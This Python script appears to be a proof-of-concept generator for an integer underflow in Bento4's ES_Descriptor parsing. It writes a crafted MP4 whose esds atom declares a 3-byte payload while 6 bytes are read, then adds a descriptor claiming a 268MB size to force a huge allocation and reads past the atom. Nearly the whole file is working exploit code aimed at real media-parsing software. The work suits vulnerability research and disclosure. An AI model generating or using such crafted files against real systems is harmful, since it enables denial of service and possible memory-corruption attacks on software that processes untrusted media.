#!/usr/bin/env python3
"""
PoC Generator for VULN 001: Integer Underflow in AP4_EsDescriptor SubStream size

Vulnerability: Ap4EsDescriptor.cpp lines 100-103
When the URL flag is set in the ES_Descriptor flags byte, the constructor
reads url_length (1 byte) and OcrEsId (2 bytes) unconditionally on top of
ES_ID (2 bytes) and flags (1 byte), consuming 6 bytes total. If the
declared payload_size = 3, then:
    payload_size - AP4_Size(offset - start) = 3 - 6 = 0xFFFFFFFA (uint32_t underflow)
This huge value is passed as size to AP4_SubStream, making it nearly
unbounded. The factory loop then reads arbitrary bytes past the esds atom,
potentially triggering huge new AP4_Byte[payload_size] allocations.

Trigger:
  - flags byte = 0x40  -> m_Flags = (0x40 >> 5) & 7 = 2 (URL flag only)
  - ES_ID: 2 bytes
  - flags: 1 byte  -> 3 bytes consumed (= declared payload_size)
  - url_length: 1 byte (outside declared payload, still read from stream)
  - OcrEsId: 2 bytes (outside declared payload, still read from stream)
  Total consumed: 6 bytes, declared: 3 -> underflow = 0xFFFFFFFA

After the underflow, we place a DECODER_SPECIFIC_INFO descriptor (tag=0x05)
with a 4-byte expandable size = 0x0FFFFFFF (268,435,455 bytes = ~256MB).
This triggers new AP4_Byte[268435455] in ReallocateBuffer, causing either:
  - std::bad_alloc crash if system lacks memory
  - Abnormal large allocation + reads from file positions far beyond esds atom
"""

import struct
import os
import sys

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")


def box(fourcc: bytes, content: bytes) -> bytes:
    """Build a basic MP4 box: 4-byte size + 4-byte type + content."""
    size = 8 + len(content)
    return struct.pack(">I", size) + fourcc + content


def fullbox(fourcc: bytes, version: int, flags: int, content: bytes) -> bytes:
    """Build a fullbox: box header + version(1) + flags(3) + content."""
    ver_flags = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return box(fourcc, ver_flags + content)


# -------------------------------------------------------------------------
# Build the esds atom
# -------------------------------------------------------------------------
# ES_Descriptor in the esds content:
#   Tag:  0x03 (ES_Descriptor tag)
#   Size: 0x03 (declared payload = 3 bytes)
#   ES_ID: 0x00 0x01  (2 bytes, payload byte 0-1)
#   flags byte: 0x40  (1 byte, payload byte 2)
#     -> m_Flags = (0x40 >> 5) & 7 = 2 (URL flag set, no STREAM_DEPENDENCY, no OCR_STREAM)
#
# The constructor then reads beyond the 3-byte declared payload:
#   url_length: 0x00   (1 byte, reads as 0 -> no url_string bytes)
#   OcrEsId:    0x0000 (2 bytes, read because URL flag is set at line 93)
#
# After reading 6 bytes total (start = payload start, offset = start+6):
#   underflow: payload_size(3) - AP4_Size(offset-start)(6) = 0xFFFFFFFA
#
# SubStream(stream, offset, 0xFFFFFFFA) is created.
# Factory loop reads from SubStream starting at position just after OcrEsId.
#
# Placed at that position:
#   0x05: AP4_DESCRIPTOR_TAG_DECODER_SPECIFIC_INFO
#   0xFF 0xFF 0xFF 0x7F: expandable size = 268,435,455 bytes
#     decoding: (((127<<7)+127)<<7+127)<<7+127 = 268435327... let me verify:
#     p=0
#     byte 0xFF: p=(0<<7)+0x7F=127, continue (0xFF&0x80=1, --max=3)
#     byte 0xFF: p=(127<<7)+0x7F=127*128+127=16383, continue (max=2)
#     byte 0xFF: p=(16383<<7)+0x7F=2097151, continue (max=1)
#     byte 0x7F: p=(2097151<<7)+0x7F=268435455, stop (0x7F&0x80=0)
#     -> payload_size = 268,435,455 bytes = 0x0FFFFFFF
#
# AP4_DecoderSpecificInfoDescriptor constructor:
#   m_Info.SetDataSize(268435455)  -> new AP4_Byte[268435455] (268 MB)
#   stream.Read(m_Info.UseData(), 268435455)  -> reads from (mostly EOF) file
#
# Expected behavior:
#   - std::bad_alloc if system can't allocate 268MB -> crash
#   - Or: large allocation succeeds, 268MB buffer allocated, tiny file read,
#     then Seek to file offset 449+5+268435455 >> file size -> OOB read

es_descriptor = (
    b"\x03"       # ES_Descriptor tag = 0x03
    b"\x03"       # declared payload_size = 3 (< 128, so 1-byte expandable encoding)
    b"\x00\x01"   # ES_ID = 1 (payload bytes 0-1)
    b"\x40"       # flags byte = 0x40 -> m_Flags = 2 = URL flag (payload byte 2)
                  # ---- declared 3-byte payload ends here ----
    b"\x00"       # url_length = 0 (outside payload, still read from stream)
    b"\x00\x00"   # OcrEsId = 0 (outside payload, still read because URL flag set)
                  # ---- SubStream created with size=0xFFFFFFFA at this point ----
    b"\x05"       # AP4_DESCRIPTOR_TAG_DECODER_SPECIFIC_INFO (0x05)
    b"\xff\xff\xff\x7f"  # 4-byte expandable size = 268,435,455 bytes (268MB)
)

esds_content = fullbox(b"esds", 0, 0, es_descriptor)[8:]  # remove outer box header trick
# Actually build it directly: fullbox for esds is: size(4)+'esds'(4)+ver/flags(4)+es_desc
esds_content_payload = es_descriptor
esds = fullbox(b"esds", 0, 0, esds_content_payload)

# -------------------------------------------------------------------------
# Build mp4a sample entry
# -------------------------------------------------------------------------
# Standard AudioSampleEntry (ISO 14496-12 §12.2):
# 6 bytes reserved + 2 bytes data_ref_idx + 8 bytes reserved
# + 2 channel_count + 2 sample_size + 2 compression_id + 2 packet_size
# + 4 sample_rate (16.16 fixed-point, high 16 = Hz, low 16 = 0)
mp4a_audio_header = (
    b"\x00" * 6         # reserved (6 bytes)
    + struct.pack(">H", 1)  # data_reference_index = 1
    + b"\x00" * 8       # reserved (8 bytes)
    + struct.pack(">H", 2)  # channelcount = 2 (stereo)
    + struct.pack(">H", 16) # samplesize = 16 bits
    + struct.pack(">H", 0)  # compression_id = 0
    + struct.pack(">H", 0)  # packet_size = 0
    + struct.pack(">HH", 44100, 0)  # sample_rate = 44100 << 16
)
mp4a = box(b"mp4a", mp4a_audio_header + esds)

# -------------------------------------------------------------------------
# Build stsd (Sample Description Box)
# -------------------------------------------------------------------------
stsd_content = (
    struct.pack(">I", 1)  # entry_count = 1
    + mp4a
)
stsd = fullbox(b"stsd", 0, 0, stsd_content)

# -------------------------------------------------------------------------
# Build sample table child boxes (all empty)
# -------------------------------------------------------------------------
stts = fullbox(b"stts", 0, 0, struct.pack(">I", 0))  # entry_count = 0
stsc = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))  # entry_count = 0
# stsz: fullbox + sample_size(4) + sample_count(4)
stsz = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))
stco = fullbox(b"stco", 0, 0, struct.pack(">I", 0))  # entry_count = 0

stbl = box(b"stbl", stsd + stts + stsc + stsz + stco)

# -------------------------------------------------------------------------
# Build minf (Media Information Box)
# -------------------------------------------------------------------------
# smhd: Sound Media Header
smhd = fullbox(b"smhd", 0, 0, struct.pack(">HH", 0, 0))  # balance=0, reserved=0

# dinf/dref: Data Information Box
# url entry: self-contained (flags=1 -> no location string)
url_entry = fullbox(b"url ", 0, 1, b"")
dref = fullbox(b"dref", 0, 0, struct.pack(">I", 1) + url_entry)  # entry_count=1
dinf = box(b"dinf", dref)

minf = box(b"minf", smhd + dinf + stbl)

# -------------------------------------------------------------------------
# Build mdia (Media Box)
# -------------------------------------------------------------------------
# mdhd: Media Header Box
mdhd = fullbox(b"mdhd", 0, 0,
    struct.pack(">IIII", 0, 0, 44100, 0)  # ct, mt, timescale, duration
    + struct.pack(">HH", 0x55C4, 0)       # language='und', pre-defined=0
)

# hdlr: Handler Reference Box
# pre_defined(4) + handler_type(4) + reserved(12) + name(1)
hdlr_content = (
    struct.pack(">I", 0)        # pre_defined = 0
    + b"soun"                   # handler_type = 'soun'
    + b"\x00" * 12              # reserved (12 bytes)
    + b"\x00"                   # name = "" (null-terminated)
)
hdlr = fullbox(b"hdlr", 0, 0, hdlr_content)

mdia = box(b"mdia", mdhd + hdlr + minf)

# -------------------------------------------------------------------------
# Build trak (Track Box)
# -------------------------------------------------------------------------
# tkhd: Track Header Box (version 0)
# version/flags: enabled=1, in_movie=2 -> flags=3
matrix_identity = (
    b"\x00\x01\x00\x00"  # a = 1.0
    b"\x00\x00\x00\x00"  # b = 0
    b"\x00\x00\x00\x00"  # u = 0
    b"\x00\x00\x00\x00"  # c = 0
    b"\x00\x01\x00\x00"  # d = 1.0
    b"\x00\x00\x00\x00"  # v = 0
    b"\x00\x00\x00\x00"  # tx = 0
    b"\x00\x00\x00\x00"  # ty = 0
    b"\x40\x00\x00\x00"  # w = 1.0 (16384 / 16384)
)  # 36 bytes
tkhd_content = (
    struct.pack(">IIIII", 0, 0, 1, 0, 0)  # ct, mt, track_id, reserved, duration
    + b"\x00" * 8              # reserved (8 bytes)
    + struct.pack(">HH", 0, 0) # layer, alternate_group
    + struct.pack(">HH", 0x0100, 0)  # volume=1.0, reserved
    + matrix_identity          # matrix (36 bytes)
    + struct.pack(">II", 0, 0) # width=0, height=0
)
tkhd = fullbox(b"tkhd", 0, 3, tkhd_content)  # flags=3: track enabled + in movie

trak = box(b"trak", tkhd + mdia)

# -------------------------------------------------------------------------
# Build mvhd (Movie Header Box, version 0)
# -------------------------------------------------------------------------
# ct(4) + mt(4) + ts(4) + dur(4) + rate(4) + vol(2) + res(10) + mat(36) + predef(24) + next(4)
mvhd_content = (
    struct.pack(">IIII", 0, 0, 44100, 0)   # creation_time, modification_time, timescale, duration
    + struct.pack(">I", 0x00010000)          # rate = 1.0 (16.16)
    + struct.pack(">H", 0x0100)             # volume = 1.0 (8.8)
    + b"\x00" * 10                          # reserved (10 bytes)
    + matrix_identity                        # matrix (36 bytes)
    + b"\x00" * 24                          # pre-defined (24 bytes)
    + struct.pack(">I", 2)                  # next_track_ID = 2
)
mvhd = fullbox(b"mvhd", 0, 0, mvhd_content)

moov = box(b"moov", mvhd + trak)

# -------------------------------------------------------------------------
# Build ftyp (File Type Box)
# -------------------------------------------------------------------------
ftyp = box(b"ftyp",
    b"M4A "                    # major_brand
    + struct.pack(">I", 0)     # minor_version
    + b"M4A "                  # compatible_brand[0]
    + b"mp42"                  # compatible_brand[1]
    + b"isom"                  # compatible_brand[2]
)

# -------------------------------------------------------------------------
# Assemble final MP4
# -------------------------------------------------------------------------
mp4_data = ftyp + moov

# -------------------------------------------------------------------------
# Verify sizes for debugging
# -------------------------------------------------------------------------
def box_info(name, data, indent=0):
    size = struct.unpack(">I", data[:4])[0]
    fourcc = data[4:8].decode("latin-1")
    print(" " * indent + f"{name}: size={size}, type='{fourcc}'")


print(f"[*] Building MP4 file: {OUT_FILE}")
print(f"[*] Total size: {len(mp4_data)} bytes")

# Verify the esds atom offset (useful for debugging)
# ftyp: len(ftyp) bytes
# moov: starts at len(ftyp)
print(f"[*] ftyp size: {len(ftyp)} bytes")
print(f"[*] moov size: {len(moov)} bytes")
print(f"[*] esds size: {len(esds)} bytes")
print(f"[*] esds content (after header): {len(es_descriptor) + 4} bytes (4 ver/flags + {len(es_descriptor)} descriptor bytes)")

# Show the ES_Descriptor breakdown
print("[*] ES_Descriptor layout:")
print("    Tag:           0x03 (ES_Descriptor)")
print("    Declared size: 0x03 (3 bytes payload)")
print("    ES_ID:         0x0001  [payload byte 0-1]")
print("    flags byte:    0x40  -> m_Flags=2 (URL flag)  [payload byte 2]")
print("    url_length:    0x00  [OUTSIDE declared payload, still read]")
print("    OcrEsId:       0x0000  [OUTSIDE declared payload, still read]")
print("    --- Underflow: payload_size(3) - (offset-start)(6) = 0xFFFFFFFA ---")
print("    --- SubStream(stream, offset, 0xFFFFFFFA) created ---")
print("    Factory loop reads:")
print("      Tag:   0x05 (DECODER_SPECIFIC_INFO)")
print("      Size:  0xFF 0xFF 0xFF 0x7F -> 268,435,455 bytes (256MB)")
print("    Expected: new AP4_Byte[268435455] -> crash or huge allocation")

# Write the file
with open(OUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUT_FILE}")
